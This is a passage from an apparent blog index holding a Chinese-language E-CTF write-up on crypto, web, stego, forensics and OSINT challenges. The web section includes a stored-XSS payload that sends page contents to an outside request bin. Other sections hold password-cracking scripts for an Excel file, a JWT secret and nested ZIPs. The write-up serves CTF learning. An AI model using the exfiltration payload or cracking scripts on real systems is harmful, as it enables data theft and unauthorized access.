年被发明，适合绝大多数场景，如数字签名、区块链和数据完整性验证。 384-bit (SHA-384): 为高安全需求设计，未有任何已知的碰撞攻击。 SHA-384 于 2001 年发明，适用于密钥交换、长时间数据存储等高安全性应用。 512-bit (SHA-512, SHA-3-512): 提供极高的安全性，特别适用于对抗潜在的量子计算威胁。 SHA-512 于 2001 年发明，性能消耗较高，适合长期存储的场景。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"哈希","slug":"哈希","permalink":"https://archer-baiyi.github.io/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/tags/Hash/"}]},{"title":"E-CTF比赛 Writeup","slug":"CTF/Writeup/E-CTF-Writeup","date":"2025-03-02T23:17:07.000Z","updated":"2025-03-25T19:31:29.228Z","comments":true,"path":"2025/03/03/CTF/Writeup/E-CTF-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/03/CTF/Writeup/E-CTF-Writeup/","excerpt":"E-CTF比赛的题解，涉及方向：Crypto, Web, Steg, Misc, Forensics, Osint","text":"1. Cryptography（密码学）ASCII me anything but not the flag 根据它的提示，我们先将这段内容用ASCII解码，得到： 123456789108 100 111 109 123 85 99 49 122 95 106 53 95 79 111 51 95 88 52 116 95 48 109 95 51 111 88 121 90 107 97 106 48 105 125 10 10 69 98 111 98 32 102 112 32 118 108 114 111 32 104 98 118 44 32 100 108 108 97 32 105 114 122 104 32 58 32 72 66 86 72 66 86 10 10 87 101 108 108 32 100 111 110 101 44 32 98 117 116 32 110 111 119 32 100 111 32 121 111 117 32 107 110 111 119 32 97 98 111 117 116 32 116 104 101 32 103 117 121 32 119 104 111 32 103 111 116 32 115 116 97 98 98 101 100 32 50 51 32 116 105 109 101 115 32 63-&gt;ldom&#123;Uc1z_j5_Oo3_X4t_0m_3oXyZkaj0i&#125;Ebob fp vlro hbv, dlla irzh : HBVHBVWell done, but now do you know about the guy who got stabbed 23 times ? 第三段的指的是凯撒大帝被刺杀的事件： 所以我们尝试遍历前两段的凯撒加密结果，但只有第二段可以得到有用信息： 1Here is your key, good luck : KEYKEY 可以得知密钥为：”HBVHBV“（我一开始以为密码就是KEYKEY）。由于第一段括号前的内容为4个字母，刚好对的上”ectf“，所以应该是单表或者多表替换加密。再因为密钥为重复的内容，不难猜测这应该是“Vigenere 维吉尼亚密码”。于是找个在线的解密网页（https://planetcalc.com/2468/#google_vignette）便可以得到flag： 1ectf&#123;th1s_i5_th3_w4y_0f_3ncrypti0n&#125; OIIAIOIIIAI 😼 由于知道这次比赛的flag格式为ectf{}，所以不难发现这串字符的偶数位应该是flag的开头，也就是： 1ectf&#123;y0U_5p1N_M3 而由于}在字符串开头，所以猜测基数位的倒序为flag的后半部分： 1R1GhT_R0unD_B4bY&#125; 拼在一起得到flag： 1ectf&#123;y0U_5p1N_M3_R1GhT_R0unD_B4bY&#125; Hashes Binder 首先会下载得到3个文件： 由于这份Excel文件被设置了密码保护，所以我们尝试用这个wordlist里的内容来爆破它： 1234567891011121314151617181920212223import msoffcryptoimport ioencrypted_file = &quot;parts.xlsx&quot; password_list = &quot;wordlist.txt&quot; with open(password_list, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f: passwords = [line.strip() for line in f.readlines()]for password in passwords: try: with open(encrypted_file, &quot;rb&quot;) as file: office_file = msoffcrypto.OfficeFile(file) office_file.load_key(password=password) decrypted_file = io.BytesIO() office_file.decrypt(decrypted_file) print(f&quot;成功破解密码: &#123;password&#125;&quot;) break except Exception: continue# 成功破解密码: dolphin 打开Excel文件后会看到3部分内容 123456789Part 1036074c2585230c1ad9e6b654a1671ac13ee856eb505f44346593e1748a6a52aPart 22H8ZcpmQyRisnPart 3cHJlc2NyaXB0aW9u 首先注意到第2，3部分非常像base64编码内容，于是尝试解码，第三部分会成功解出来： 1prescription 第二部分则提示解码失败，所以我们尝试其他base解码，最后用base58成功解码得到： 1digestive 第一部分则非常像哈希加密的结果，所以我们用这个网站试一下能不能破解 https://hashes.com/en/decrypt/hash 提示破解成功，原文为spooky，并且使用的算法是Gost Hash。（spooky其实也在这个wordlist.txt里，所以理论上来说这一步也可以用爆破得到。） 于是用 1dolphin_spooky_digestive_prescription 成功解压.zip压缩包得到flag： 1ECTF&#123;J0nH_tH3_Cr4ck3R_95234826&#125; RSA intro 这道题我们会得到以下内容： 1234n = 1184757578872726401875541948122658312538049254193811194706693679652903378440466755792536161053191231432973156335040510349121778456628168943028766026325269453310699198719079556693102485413885649073042144349442001704335216057511775363148519784811675479570531670763418634378774880394019792620389776531074083392140830437849497447329664549296428813777546855940919082901504207170768426813757805483319503728328687467699567371168782338826298888423104758901089557046371665629255777197328691825066749074347103563098441361558833400318385188377678083115037778182654607468940072820501076215527837271902427707151244226579090790964814802124666768804586924537209470827885832840263287617652116022064863681106011820233657970964986092799261540575771674176693421056457946384672759579487892764356140012868139174882562700663398653410810939857286089056807943991134484292518274473171647231470366805379774254724269612848224383658855657086251162811678080812135302264683778545807214278668333366983221748107612374568726991332801566415332661851729896598399859186545014999769601615937310266497300349207439222706313193098254004197684614395013043216709335205659801602035088735521560206321305834999363607988482888525092210585343868702766655032190348593070756595867719633492847013620378010952424253098519859359544101947494405255181048550165119679168071637363387551385352023888031983210940358096667928019837327581681936262186049576626435407253113152851511562799379477905913074052917135254673527350886619693800827592241738185465519368503599267554966329609741719839452532720121891782656000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001e = 65537c = 393830705821083872264416484945379590743951209334251680140561629963083955435155434968501995173717065691853716117413549060471633713246813706134614822460487831949312719410922980049951577395596254279195364667821988767675462852220254638390252652391863031378262058213973374365653466528787640726441241664538814924465041415751207617994829099967542528845558372954608772395722055861369383117996161988362298650918468621344968162697585757444815069821774651095279049590140325395770490299618719676066106689396243767847620065054763147901166291755102218540290732819710294120101688593205036339603152228827861450774360237006971191234350634731104643779249017990427055169232234892324512234471025984131134122883594190002695857381320761826426970820621555957081409595866374650139218172798735536295519361258955868218458841069870611367807353745731928726480481254620623949030522228724677423429285228917983167742866068764059333196595815029550909470984427785123479796787934189869159245455191142352654087327876642690754428041545205764160668875253155015956045237338532248073834631989395905208181116526111301051883717335829373670674970007067708289628731972707477338551521585672558157829354894929466723788269911067380887281008564055766243843557738727000164255990684153972958815292767702154995098383096546576559199090417518282978657504210433584144451378874050676287588884988934683793378300065910040270282398699691108573435112129408980056605713259535036581461672565785674329469547540861581715756111296028940885214170609934085009608200810707122173370006290459841638659407675519141544675968270051746963709729460531469035621873301953785282870733516854080405064440750450304537433849449545664331761838457477121677018421695909336075840076436991397964264703526101810961378256559625011198775706699 因为没有其他信息了，所以我们先用 http://www.factordb.com/index.php 试一下暴力分解n： 成功得到n的其中一个因数为5054843。之后就只需要写一段代码解密就可以得到flag： 123456789101112131415from Crypto.Util.number import inverse, long_to_bytesdef rsa_decrypt(n, e, c, p): q = n // p phi_n = (p - 1) * (q - 1) d = inverse(e, phi_n) m = pow(c, d, n) return long_to_bytes(m).decode(&#x27;utf-8&#x27;)n = e = 65537c = p = 5054843 plaintext = rsa_decrypt(n, e, c, p)print(&quot;解密结果:&quot;, plaintext)# 解密结果: ectf&#123;b4sic_F4cT0rDb_rS4&#125; Cracking the Vault 这道题我们会得到2份文件，一份是python的代码，关于加密算法的，另一份文件则是加密后的结果。 我们首先来看一下加密的具体过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import secretsimport hashlibdef encryption(text): encrypted = [] random = secrets.SystemRandom() padding_length = 256 - len(text) % 256 raw_padding = [chr(random.randint(32, 126)) for _ in range(padding_length)] scrambled_padding = [chr((ord(c) * 3 + 7) % 94 + 32) for c in raw_padding] shifted_padding = scrambled_padding[::-1] padded_text = &#x27;&#x27;.join(shifted_padding) + text final_padded_text = &#x27;&#x27;.join( chr((ord(c) ^ 42) % 94 + 32) if i % 2 == 0 else c for i, c in enumerate(padded_text) ) secret_key = str(sum(ord(c) for c in text)) secret_key = secret_key[::-1] hashed_key = hashlib.sha256(secret_key.encode()).hexdigest() seed = int(hashed_key[:16], 16) random = secrets.SystemRandom(seed) for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return &#x27;&#x27;.join(encrypted), seedwith open(&#x27;VaultKey.txt&#x27;, &#x27;r&#x27;) as f: text = f.read()encrypted_text, seed = encryption(text)with open(&#x27;VaultKey_encrypted.txt&#x27;, &#x27;w&#x27;) as f: f.write(encrypted_text)print(&quot;The file has been successfully encrypted!&quot;) 我们可以注意到这段代码里有很多多余的内容（指没有真正出现在加密过程中），真正跟加密算法相关的其实只有这一段 1234567for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return &#x27;&#x27;.join(encrypted), seed 所以我们只需要逆向一下这个加密逻辑便可以得到flag： 123456789101112131415def decryption(encrypted_text): decrypted_chars = [] for i, enc_char in enumerate(encrypted_text): enc_code = ord(enc_char) shift = 3 * (i + 1) + 67 orig_code = (enc_code - shift) % 256 decrypted_chars.append(chr(orig_code)) return &#x27;&#x27;.join(decrypted_chars)with open(&#x27;VaultKey_encrypted.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f: encrypted_text = f.read()print(decryption(encrypted_text))# Well done! I bet you&#x27;re great at math. Here&#x27;s your flag, buddy: ectf&#123;1t_W45_ju5T_4_m1nu5&#125; Never two without three 我们首先会得到这些内容： 1AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY 直接尝试base64解码会提示失败，所以根据它的提示我们先遍历它的所有凯撒加密然后再解码： 12345678910111213141516171819202122232425262728293031import base64import stringdef caesar_cipher_decrypt(text, shift): decrypted_text = &quot;&quot; for char in text: if char in string.ascii_letters: is_upper = char.isupper() alphabet = string.ascii_uppercase if is_upper else string.ascii_lowercase new_index = (alphabet.index(char) - shift) % 26 decrypted_text += alphabet[new_index] else: decrypted_text += char return decrypted_textdef try_base64_decode(text): try: decoded_data = base64.b64decode(text).decode(&#x27;utf-8&#x27;) return decoded_data except Exception: return Nonecipher_text = &quot;AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY&quot;for shift in range(26): decrypted_text = caesar_cipher_decrypt(cipher_text, shift) base64_decoded = try_base64_decode(decrypted_text) if base64_decoded: print(f&quot;Shift: &#123;shift&#125;, 解码: &#123;base64_decoded&#125;&quot;)# Shift: 10, 解码: ADeyMxwfsMLjPNnAgTUkMnEvT6gKMs41F7qKoryxG8LhK5SYY4gRKKKu96LtyZN 发现这是唯一可以成功解码出来的内容。我们再次尝试用base64解码这段内容会提示失败，所以还是转战其他的base编码，最后再次用base58成功解码得到： 1The flag is: ectf&#123;D0_u_l0v3_t4e_crypt0grap413&#125; 2. WebJava Weak Token 先简单科普一下JWT： JWT是一串base64编码，被用.分成3部分。第一部分是header，里面会写使用的算法以及typ（一般都是JWT）。第二部分是Payload，是JWT的核心内容，通常会纪录当前JWT所有者的身份信息。第三部分则是签名，会计算 1HMACSHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload),密钥) 以确保当前信息的完整性（integrity），真实性（authenticity）。 在这道题我们会首先在目标网站里得到我们的JWT（我们每次访问网站都会得到一个新的JWT）： 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM 用 https://jwt.io/ 分析一下： 可以看到，Payload里有一个名为”username“的值当前被设置为“user”，我们猜测只需要将其改成“admin”并且用其再次访问网站即可获得flag。 根据题目的提示，我们先将这个JWT的密钥给爆破出来： 1234567891011121314151617181920212223242526272829import jwtimport timedef brute_force_jwt(token): # header, payload, signature = token.split(&#x27;.&#x27;) with open(&quot;rockyou.txt&quot;, &#x27;r&#x27;, encoding=&#x27;latin-1&#x27;) as f: for line in f: secret = line.strip() try: decoded = jwt.decode(token, secret, algorithms=[&#x27;HS256&#x27;]) print(f&quot;[+] Found secret key: &#123;secret&#125;&quot;) print(f&quot;Decoded JWT: &#123;decoded&#125;&quot;) return secret except jwt.ExpiredSignatureError: print(f&quot;[-] Expired token with key: &#123;secret&#125;&quot;) return secret except jwt.InvalidTokenError: pass print(&quot;[-] No valid secret found in wordlist.&quot;) return Nonejwt_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM&quot;brute_force_jwt(jwt_token)# [+] Found secret key: 1234 用这个网站将我们的JWT的payload改成“admin” 之后再用这个新的JWT访问网站即可得到flag： 1ectf&#123;JwT_T0keN_cR34t0r&#125; Chat with the admin 这道题比较明显地暗示了我们需要用xss攻击来获取flag。我们首先在 https://pipedream.com/ 创建一个Request Bin（创建临时的 HTTP 端点，用于捕获和检查传入的 HTTP 请求。）， 然后在对话框里输入以下内容即可： 1&lt;script&gt;fetch(&#x27;http://instances.ectf.fr:11111/&#x27;).then(response =&gt; response.text()).then(text =&gt; document.location=&quot;https://xxxxxxxxxxxx.m.pipedream.net?flag=&quot;+btoa(encodeURIComponent(text)))&lt;/script&gt; 之后便会在Request Bin的访问纪录里查看flag： 1ECTF&#123;Cook13_st0L3n_5ucc3ssfuLLy&#125; 3. Steganography（隐写）Definitely not in the PDF 将下载的压缩包解压会得到一份pdf文件： /Stega_-_Definitely_not_in_the_PDF/world_flags.jpg) 并没有任何发现，再根据他一直说的“flag”不在这里，于是决定去看一开始的压缩包。果然在文件结尾发现flag： 1ECTF&#123;W3lL_d0nE_652651663616263&#125; JB1804 我们会得到一份乐谱： 通过检查发现它并没有隐写任何内容在hex文件里，抑或是LSB隐写。 通过谷歌搜索“music Steganography 1804”可以发现这个维基词条： 点进去之后搜索“1804”会发现Johann Bücking在1804年发明了一种乐谱密码： 根据这张密码表解码会得到： 1ectf&#123;steganomousiqueissuperswag&#125; (法语中的“音乐“是”musique“，所以flag的内容为stegano mousique is super swag。) The island’s treasure 下载文件会得到2张图片： 首先用010 Editor打开第一张图片会发现 在Description后面有一段base64编码 1UnNPcGJHbGphWFJoZEdsdmJuTWdJU0JVZFNCaGN5QjBjbTkxZHNPcElHeGhJR05zdzZrZ2JzS3dNU0JrZFNCamIyWm1jbVVnSVEwS1EyOXVaM0poZEhWc1lYUnBiMjV6SUNFZ1dXOTFJR1p2ZFc1a0lIUm9aU0JyWlhrZ2JzS3dNU0J2WmlCMGFHVWdZMmhsYzNRZ0lRMEtRMnpEcVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTU5Da3RsZVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTT0= 解码后会得到 1RsOpbGljaXRhdGlvbnMgISBUdSBhcyB0cm91dsOpIGxhIGNsw6kgbsKwMSBkdSBjb2ZmcmUgIQ0KQ29uZ3JhdHVsYXRpb25zICEgWW91IGZvdW5kIHRoZSBrZXkgbsKwMSBvZiB0aGUgY2hlc3QgIQ0KQ2zDqTogTTN0NGQ0dDRfMTVfbjB0XzVhZjMNCktleTogTTN0NGQ0dDRfMTVfbjB0XzVhZjM= 再解码一次会得到key1： 1234Félicitations ! Tu as trouvé la clé n°1 du coffre !Congratulations ! You found the key n°1 of the chest !Clé: M3t4d4t4_15_n0t_5af3Key: M3t4d4t4_15_n0t_5af3 因为hex文件里面看起来找不到第二段key了，所以我们用Stegsolve.jar打开这张图片查看是否有用LSB隐写的内容。当调整到Red Plane 0时会得到 我们将这张照片导出会得到第二部分的key（key2）： 123key1: M3t4d4t4_15_n0t_5af3key2: Hidd3n_p1ctur3key = key1:key2 = M3t4d4t4_15_n0t_5af3:Hidd3n_p1ctur3 然后我们现在来打开箱子：根据提示，支持加密隐写并且有GUI的软件并不多，所以我们来试一下OpenStego： 提取出来的照片为： 成功找到flag： 1ECTF&#123;You_found_th3_tr3asur3&#125; Silhouette in cyberpunk 这道题我们会得到一张图片： 非常赛博风。 注意到这两个地方的点组的排列非常像我们日常生活中（比如说电梯里）会碰到的盲文： （近点的那栋大楼） （画面左边远处的那栋大楼） 第一张里面的盲文翻译过来是： 1This is just a dummyy, nice try 而第二张里面的内容才是真正的flag： 12345⠓⠼⠁⠙⠙⠼⠉⠝⠼⠁⠝⠹⠼⠉⠙⠼⠙⠗⠅⠝⠼⠉⠎⠎-&gt;h1dd3n1nth3d4rkn3ss (可以用这个网站翻译盲文内容：https://www.dcode.fr/alphabet-braille) 根据题目的flag格式要求，我们确定flag为： 1ectf&#123;h1dd3n_1n_th3_d4rkn3ss&#125; 4. MiscellaneousExtraction Mission Heart of the vault 这道题我们会得到一个加密的压缩包Misc_5_-_dwarf_vault_200.zip，将其爆破之后会再次得到一个加密的压缩包dwarf_vault_199.zip，再重复一次操作会得到dwarf_vault_198.zip，也是加密了的。所以我们猜测作者将一份文件（夹）重复加密压缩了200次。所以决定写一个脚本自动化完成这些操作，并且根据提示将所有密码保存进一个txt文件里： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import zipfileimport osimport shutilimport zlib# 定义初始zip文件路径和字典文件路径zip_path = &quot;Misc_5_-_dwarf_vault_200.zip&quot;dict_path = &quot;rockyou.txt&quot;passwords = [] # 记录所有找到的密码def brute_force_zip(zip_path, dict_path): try: with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_file: with open(dict_path, &quot;r&quot;, encoding=&quot;latin-1&quot;) as f: for line in f: password = line.strip().encode(&quot;latin-1&quot;) # 转换为字节格式 try: zip_file.extractall(pwd=password) print(f&quot;[+] 找到密码: &#123;password.decode()&#125;&quot;) passwords.append(password.decode()) # 获取解压后的文件夹或文件名 extracted_files = zip_file.namelist() return extracted_files # 返回解压出的文件名列表 except (RuntimeError, zipfile.BadZipFile, zlib.error): continue print(&quot;[-] 未找到密码，请尝试其他字典或方法。&quot;) return None except FileNotFoundError: print(&quot;[!] 文件未找到，请检查路径是否正确。&quot;) return None except zlib.error: print(&quot;[!] 遇到 zlib 解压错误，终止爆破。&quot;) return None# 递归解压直到没有更多 zip 文件def recursive_brute_force(zip_path, dict_path): try: while zip_path: extracted_files = brute_force_zip(zip_path, dict_path) if not extracted_files: break # 查找新的 ZIP 文件 new_zip_path = None for file in extracted_files: if file.endswith(&quot;.zip&quot;): new_zip_path = file break if new_zip_path: zip_path = new_zip_path # 直接使用新找到的 ZIP 文件 else: print(&quot;[!] 没有找到更多的 ZIP 文件，任务完成！&quot;) break except zlib.error: print(&quot;[!] 发生 zlib 错误，终止爆破。&quot;) finally: # 将所有找到的密码写入文件 with open(&quot;found_passwords.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f: for password in passwords: f.write(password + &quot;\\n&quot;)# 运行爆破函数recursive_brute_force(zip_path, dict_path)print(&quot;所有找到的密码:&quot;, passwords) 注意，爆破到dwarf_vault_1.zip经常会返回奇怪的ERROR，所以这里的代码逻辑最好是在遇到意外ERROR时直接终止爆破并将现有的所有密码先写进txt文件，不然容易卡在这里重复很多次。 再成功解压dwarf_vault_1.zip后，我们会得到2份文件：drop_pod.py以及mining_report.txt。 txt文件的内容为： 1Mining report - flag coordinates: ectf&#123;[[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]&#125; 用coordinate将flag表示了出来。于是来检查drop_pod.py的内容： 12345678910111213141516171819202122232425262728293031323334#Maybe the flag was the friends we made along the waypassword = &quot; &quot;flag = &quot;FAKE FLAG THIS IS NOT REAL&quot;def find_positions(flag, crew_list): positions = [] for char in flag: if char == &quot;_&quot;: positions.append(&quot;_&quot;) continue found = False for i, name in enumerate(crew_list): if char.lower() in name.lower(): positions.append([i, name.lower().index(char.lower())]) found = True break if not found: positions.append([None, None]) return positionspositions = find_positions(flag, password.split())output_text = &quot;Mining report - flag coordinates: ectf&#123;&quot; + str(positions) + &quot;&#125;&quot;with open(&quot;mining_report.txt&quot;, &quot;w&quot;) as file: file.write(output_text)print(&quot;Rock and Stone! Report written to mining_report.txt:&quot;, output_text) 是这段坐标的生成逻辑。所以可以编写一段代码，靠我们刚才保存的所有压缩密码来还原flag： 123456789101112131415161718192021222324252627with open(&quot;found_passwords.txt&quot;, &quot;r&quot;) as file: reversed_passwords = file.readlines()# 去除换行符并反转列表（因为我们爆破时是从200开始的，所以这里需要反过来）password_list = [line.strip() for line in reversed_passwords][::-1]#txt里的内容positions = [[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]# 还原 flagflag = &quot;&quot;for pos in positions: if pos == &quot;_&quot;: flag += &quot;_&quot; else: i, j = pos if 0 &lt;= i &lt; len(password_list) and 0 &lt;= j &lt; len(password_list[i]): flag += password_list[i][j] else: flag += &quot;?&quot; # 标记错误或缺失数据# 输出结果print(&quot;flag:&quot;, &quot;ectf&#123;&quot; + flag + &quot;&#125;&quot;)# flag: ectf&#123;d1ggy_d1ggy_h0l3&#125; 5. ForensicMy dearest 我们会得到一份docx文件，也就是word文件。打开后在信息的作者处即可找到文件作者： 根据题目要求，flag为： 1ectf&#123;MichelTeller&#125; Capture the hidden 这道题我们会得到一份.pcap文件，用Wireshark打开它。 由于是要找一份文件，我们先点击“文件” -&gt; “导出对象” -&gt; “HTTP”： 确实发现了一份上传的文件。可以点击保存它，但是打开会发现内容不不完整： 12345data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5-&gt;(base64)ectf&#123;P05t_1s_v3ry_345y_T0_F1N 于是我们找这份文件在纪录里的具体位置： 可以看到我们保存的upload的文件内容只有蓝色部分，当我们将后续的内容也提出来，便会得到完整的flag： 12345data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5EfQ==-&gt;(base64)ectf&#123;P05t_1s_v3ry_345y_T0_F1ND&#125; Just a PCAP 这道题也是一份pcap文件，再次用Wireshark打开。 但是用之前的操作：“文件” -&gt; “导出对象” -&gt; “HTTP”，并不会发现任何东西。（实际上是因为这段纪录里并没有任何HTTP传输的内容。） 这时我们仔细观察第一条纪录的info会发现它是以”89504E47“，这是非常典型的PNG文件的文件头（因为它对应ASCII字符“‰PNG”），所以我们猜测这些纪录的info内容可以拼成一份完整的PNG文件。我们用这段代码将所有纪录的info内容提取出来并且保存成.png：（这段代码能运行的前提条件是下载了Wireshark\\的tshark.exe 123456789101112131415import pysharkimport pyshark.packetfrom binascii import unhexlifycapture = pyshark.FileCapture(&#x27;justapcap.pcap&#x27;, tshark_path=&#x27;D:\\\\Program Files\\\\Wireshark\\\\tshark.exe&#x27;) # 将这个路径替换成自己电脑上tshark.exe的路径hexstr = &quot;&quot;cnt = 0for packet in capture: s = str(packet) cur = s.split(&quot;Name:&quot;)[-1].split(&quot;.&quot;)[0].split(&quot;1m &quot;)[1] hexstr += curhexstr = hexstr.split(&quot;exam&quot;)[0]with open(&quot;a.png&quot;,&quot;wb&quot;) as f: f.write(unhexlify(hexstr)) 然后就会得到这张图片： 1ectf&#123;DN5_3xf1ltr@t10n_15_flnd3d&#125; 6. OsintProject-153-Q1 这道题我们会得到这张图片： 通过谷歌识图可以很轻易地知道这个地方是：Falls Caramy, 法语原名为Chutes_du_Caramy。 得到flag： 1ectf&#123;Chutes_du_Caramy&#125; Project-153-Q2 这道题我们会得到这张图片： 通过谷歌识图可以判断出来这张照片是在 Massif de l’Esterel 附近拍摄的。 但由于题目要求的是拍摄时所处的具体位置，所以我们还需要找些其他的线索。 注意到图片远处这里，有一座全是房子的半岛： 于是我们打开Google Earth，查看Massif de l’Esterel附近的海岸线。可以发现这个地方非常想图中的半岛： 并且点开 Calanque de l’Esterel, 83700 Saint-Raphaël, 法国 的相册可以看到这样一张图片： 跟我们图片里的一模一样。沿着这个方向依次尝试带有名字的地点，便可以成功找到拍摄地：Pointe de l’Observatoire, D559, 83700 Saint-Raphaël, 法国。 1ectf&#123;Pointe_de_l&#x27;Observatoire&#125; Project-153-Q3 这道题我们会得到这张图片： 再次通过谷歌识图可以发现图片所在地是 Rocher de Roquebrune： 在Google Earth找到这里 便可以在相册里发现这张图片，大概率是题目所指的“monster： 所以答案为左下角的作者名字。 1ectf&#123;Michael_DELAETER&#125; Project-153-Q4 首先通过谷歌识图判断出照片所在地应该是：Bormes-les-Mimosas 在Google Earth找到这里： 根据照片拍摄角度以及题目描述不难猜出远处的那座岛应该是 Île du Levant。 1ectf&#123;Île_du_Levant&#125; Project-153-Q5 这道题我们会得到这张图片： /OSINT_1_-_question-5/PANO_20220408_134922.jpg) 这道题会碰到一个非常有意思的事情。我们拿到的图片的文件大小为29.8 MB，而谷歌识图的上限为20MB，所以我们首先需要压缩一下图片的大小才能使用谷歌识图。我这里是用微信来进行有损压缩的。 然后便可以用谷歌识图来确认地点： 1ectf&#123;Gros_Cerveau&#125; (在法语中，“le” 是阳性单数定冠词，所以不包含在答案内。) Project-153-Q6 这道题我们会得到这张图片： 再次通过谷歌识图我们可以找到这样一条Instergram： （为了防止侵犯个人隐私我给图片打了个码。） 于是可以得知这张照片的拍摄所在地为 Moustiers-Sainte-Marie （zipcode：04360）。 至于台阶数可以直接利用开了联网功能的ChatGPT所搜即可： 最后的flag为： 1ectf&#123;262_04360&#125; PNJ - 3 - Gouzou 这道题我们会得到一个文件夹，里面有非常多的文件，它说的这个“the”属实是有点意义不明，所以我们先去搜索看一下GOUZOU是什么： 发现是法国艺术家JACE创作一个没有五官的诙谐卡通形象。根据这条线索我们可以锁定这张图片（也就是说我们需要找的应该是这张图片的具体位置）： 根据谷歌识图可以发现这张照片在 “Île de Ré”（雷岛）： 通过搜索“île de ré gouzou”可以找到这个网页：https://www.realahune.fr/les-murs-dexpression-de-latlantique/，并且发现： 于是我们确定这幅画是在”la digue du Boutillon, île de Ré”(是一座防波堤)，得到flag： 1ectf&#123;digue_du_boutillon&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"},{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"ERA 计算机体系结构","slug":"TUM课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/categories/CTF/Misc/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"},{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/categories/CTF/Reverse-Engineering/"},{"name":"Dantenbank 